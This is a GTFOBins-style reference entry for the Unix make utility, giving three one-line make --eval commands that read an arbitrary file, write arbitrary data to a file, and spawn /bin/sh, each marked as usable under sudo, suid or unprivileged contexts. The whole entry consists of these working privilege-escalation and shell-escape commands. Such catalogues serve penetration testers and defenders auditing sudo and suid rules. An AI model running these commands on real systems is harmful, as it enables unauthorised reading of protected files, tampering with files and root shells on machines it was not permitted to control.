---
type: gtfobin
name: make
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# make

## file-read

```bash
make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
```
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
make -s --eval='$(file >/path/to/output-file,DATA)' .
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
make --eval='$(shell /bin/sh 1>&0)' .
```
**Contexts:** sudo, suid, unprivileged
